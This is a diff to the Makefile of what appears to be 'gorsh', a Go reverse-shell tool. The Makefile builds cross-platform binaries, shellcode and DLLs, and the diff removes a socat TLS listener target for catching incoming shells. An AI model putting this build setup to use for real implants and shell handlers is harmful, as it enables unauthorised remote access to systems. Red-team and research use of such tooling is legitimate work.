@@ -41,21 +41,13 @@ SOCAT = /usr/bin/socat
 all: $(PLATFORMS) server shellcode dll
 
 .PHONY: $(PLATFORMS)
-${PLATFORMS}: $(PKEY) $(SRV_KEY)
+${PLATFORMS}: server $(PKEY) $(SRV_KEY)
 	${ENV.${target}} \
 	GOOS=${target} ${BUILD} \
-		-buildmode pie \
 		-ldflags ${LDFLAGS} \
 		${ZSTD.${target}} \
 		-o ${OUT}/${APP}.${target} \
 		cmd/gorsh/main.go
-
-.PHONY: listen listen-socat
-listen listen-socat: $(SRV_KEY) $(SOCAT)
-	@test -n "$(PORT)" || (echo "PORT not defined"; exit 1)
-	${SOCAT} -d \
-		OPENSSL-LISTEN:${PORT},fork,key=${SRV_KEY},cert=${SRV_PEM},reuseaddr,verify=0 \
-		EXEC:scripts/${target}.sh
 
 .PHONY: server
 server:
@@ -96,9 +88,6 @@ scripts:
 
 $(GODONUT):
 	go get github.com/Binject/go-donut
-
-$(SOCAT):
-	sudo apt get install socat
 
 $(PKEY):
 	ssh-keygen -t ed25519 -f ${target} -N ''
